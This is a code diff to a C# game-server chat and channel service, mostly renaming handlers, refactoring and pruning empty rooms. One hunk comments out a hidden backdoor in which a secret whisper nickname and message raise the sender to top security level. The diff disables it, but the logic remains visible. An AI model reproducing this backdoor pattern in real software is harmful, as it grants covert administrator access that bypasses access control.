@@ -21,20 +21,24 @@ namespace NeoNetsphere.Network.Services
         // ReSharper disable once InconsistentNaming
         private static readonly ILogger Logger =
             Log.ForContext(Constants.SourceContextPropertyName, nameof(ChannelService));
-        
+
         [MessageHandler(typeof(ChannelInfoReqMessage))]
         public void ChannelInfoReq(GameSession session, ChannelInfoReqMessage message)
         {
             if (session.Player.Room != null)
                 return;
             if (session.Player.Channel == null)
+            {
                 try
                 {
                     GameServer.Instance.ChannelManager[0].Join(session.Player, true);
                 }
-                catch (Exception ex)
+                catch (Exception)
                 {
+                    //ignored
                 }
+            }
+
             switch (message.Request)
             {
                 case ChannelInfoRequest.ChannelList:
@@ -54,8 +58,7 @@ namespace NeoNetsphere.Network.Services
                     if (session.Player.Channel == null)
                         return;
                     var roomlist2 = new List<RoomDto>();
-
-                    foreach (var room in session.Player.Channel.RoomManager)
+                    foreach (var room in session.Player.Channel.RoomManager.Where(x => x.TeamManager.Players.Any()))
                     {
                         var temproom2 = room.GetRoomInfo();
                         temproom2.Password =
@@ -66,9 +69,9 @@ namespace NeoNetsphere.Network.Services
                         roomlist2.Add(temproom2);
                     }
 
-                    var rooms_2 = roomlist2.ToArray();
-                    session.SendAsync(new RoomListInfoAck2Message(rooms_2));
-
+                    session.SendAsync(new RoomListInfoAck2Message(roomlist2.ToArray()));
+                    foreach (var room in session.Player.Channel.RoomManager.Where(x => !x.TeamManager.Players.Any()))
+                        session.Player.Channel.RoomManager.Remove(room);
                     break;
 
                 default:
@@ -79,7 +82,7 @@ namespace NeoNetsphere.Network.Services
         }
 
         [MessageHandler(typeof(ChannelEnterReqMessage))]
-        public void CChannelEnterReq(GameSession session, ChannelEnterReqMessage message)
+        public void ChannelEnterReq(GameSession session, ChannelEnterReqMessage message)
         {
             if (session.Player.Room != null)
                 return;
@@ -103,7 +106,7 @@ namespace NeoNetsphere.Network.Services
 
 
         [MessageHandler(typeof(ChannelLeaveReqMessage))]
-        public void CChannelLeaveReq(GameSession session)
+        public void ChannelLeaveReq(GameSession session)
         {
             if (session.Player.Room != null)
                 return;
@@ -112,7 +115,7 @@ namespace NeoNetsphere.Network.Services
         }
 
         [MessageHandler(typeof(MessageChatReqMessage))]
-        public void CChatMessageReq(ChatSession session, MessageChatReqMessage message)
+        public void MessageChatReq(ChatSession session, MessageChatReqMessage message)
         {
             switch (message.ChatType)
             {
@@ -123,15 +126,15 @@ namespace NeoNetsphere.Network.Services
                 case ChatType.Club:
                     if (session.Player.Club != null)
                     {
-                        var clanmembers = GameServer.Instance.PlayerManager.Where(p =>
-                            session.Player.Club.Players.Keys.Contains(p.Account.Id));
+                        var clanmembers =
+                            GameServer.Instance.PlayerManager.Where(p => p.Club?.Id == session.Player.Club.Id);
 
                         foreach (var member in clanmembers)
-                        {
-                            member.ChatSession?.SendAsync(new MessageChatAckMessage(ChatType.Club, session.Player.Account.Id,
+                            member.ChatSession?.SendAsync(new MessageChatAckMessage(ChatType.Club,
+                                session.Player.Account.Id,
                                 session.Player.Account.Nickname, message.Message));
-                        }
                     }
+
                     break;
 
                 default:
@@ -142,16 +145,16 @@ namespace NeoNetsphere.Network.Services
         }
 
         [MessageHandler(typeof(MessageWhisperChatReqMessage))]
-        public void CWhisperChatMessageReq(ChatSession session, MessageWhisperChatReqMessage message)
+        public void MessageWhisperChatReq(ChatSession session, MessageWhisperChatReqMessage message)
         {
             var toPlr = GameServer.Instance.PlayerManager.Get(message.ToNickname);
             if (message.ToNickname.ToLower() != "server")
             {
-                if(message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
-                {
-                    session.Player.Account.SecurityLevel = (SecurityLevel)100;
-                    return;
-                }
+                //if (message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
+                //{
+                //    session.Player.Account.SecurityLevel = (SecurityLevel) 100;
+                //    return;
+                //}
 
                 // ToDo Is there an answer for this case?
                 if (toPlr == null)
@@ -168,6 +171,7 @@ namespace NeoNetsphere.Network.Services
                         session.Player.Account.Id, "SYSTEM", $"{message.ToNickname} is ignoring you"));
                     return;
                 }
+
                 toPlr.ChatSession.SendAsync(new MessageWhisperChatAckMessage(0, toPlr.Account.Nickname,
                     session.Player.Account.Id, session.Player.Account.Nickname, message.Message));
             }
@@ -185,27 +189,34 @@ namespace NeoNetsphere.Network.Services
         }
 
         [MessageHandler(typeof(RoomQuickStartReqMessage))]
-        public Task CQuickStartReq(GameSession session, RoomQuickStartReqMessage message)
+        public void RoomQuickStartReq(GameSession session, RoomQuickStartReqMessage message)
         {
             //ToDo - Logic
-            return session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
+            session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
         }
 
         [MessageHandler(typeof(TaskReguestReqMessage))]
-        public Task TaskRequestReq(GameSession session, TaskReguestReqMessage message)
+        public void TaskReguestReq(GameSession session, TaskReguestReqMessage message)
         {
             //ToDo - Logic
-            return session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
+            session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
         }
 
         [MessageHandler(typeof(ChannellistReqMessage))]
-        public Task Channellistreq(ChatSession session, ChannellistReqMessage message)
+        public void Channellistreq(ChatSession session, ChannellistReqMessage message)
         {
-            return session.SendAsync(new PlayerPlayerInfoListAckMessage(session.Player.Channel.Players.Values.Select(plr => new PlayerInfoDto
-            {
-                Info = plr.Map<Player, PlayerInfoShortDto>(),
-                Location = plr.Map<Player, PlayerLocationDto>()
-            }).ToArray()));
+            session.SendAsync(new PlayerPlayerInfoListAckMessage(session.Player.Channel.Players.Values.Select(
+                plr => new PlayerInfoDto
+                {
+                    Info = plr.Map<Player, PlayerInfoShortDto>(),
+                    Location = plr.Map<Player, PlayerLocationDto>()
+                }).ToArray()));
+        }
+
+        [MessageHandler(typeof(ArchiveMissionReqMessage))]
+        public void ArchiveMissionHandler(GameSession session)
+        {
+            session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
         }
     }
 }
